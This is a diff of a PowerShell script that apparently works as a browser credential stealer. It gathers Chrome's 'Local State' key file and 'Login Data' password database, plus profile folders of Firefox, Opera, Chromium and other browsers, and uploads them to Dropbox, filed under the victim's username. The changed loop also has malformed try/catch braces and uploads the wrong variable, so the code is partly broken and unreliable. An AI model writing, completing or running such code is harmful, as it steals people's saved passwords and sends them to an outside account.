@@ -1,8 +1,8 @@
 
 # Specify the path to the Local State file
 $paths = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Login Data",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\",
     "$env:LOCALAPPDATA\Google\Chrome\User Data\",
     "$env:LOCALAPPDATA\Mozilla\Firefox\\Profiles\",
     "$env:APPDATA\Opera Software\Opera Stable\",
@@ -21,6 +21,13 @@ $paths = @(
     "$env:LOCALAPPDATA\Chromium\User Data\"
 
 )
+
+$files = @(
+    "Local State",
+    "Login Data"
+)
+
+
 function Get-CurrentUser {
     $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
     return $currentUser.Name
@@ -67,18 +74,21 @@ function Upload-ToDropbox {
 foreach ($path in $paths) {
     # Get the file name
     try {
-
-        $parentDirectory = Split-Path -Path $path -Parent
-        $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
-        $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
-        $relativePath = $path.Replace($greatGrandParentDirectory + "\", "")
-        $OutPath = Join-Path -Path $currentUser -ChildPath $RelativePath
-        Upload-ToDropbox -FilePath $path -DestinationPath $OutPath
-
+        foreach($file in $files) {
+            try {
+                $fullPath = Join-Path -Path $path -ChildPath $file
+                $parentDirectory = Split-Path -Path $fullPath -Parent
+                $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
+                $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
+                $relativePath = $fullPath.Replace($greatGrandParentDirectory + "\", "")
+                $OutPath = Join-Path -Path $currentUser -ChildPath $RelativePath
+                Upload-ToDropbox -FilePath $path -DestinationPath $OutPath
+            }
+            } catch {
+                Write-Output "Failed out of entire thing"
+            }   
     } catch {
-        Write-Output "Failed to upload $path"
+        Write-Output "Failed out of entire thing"
     }
-    
-
 }
 
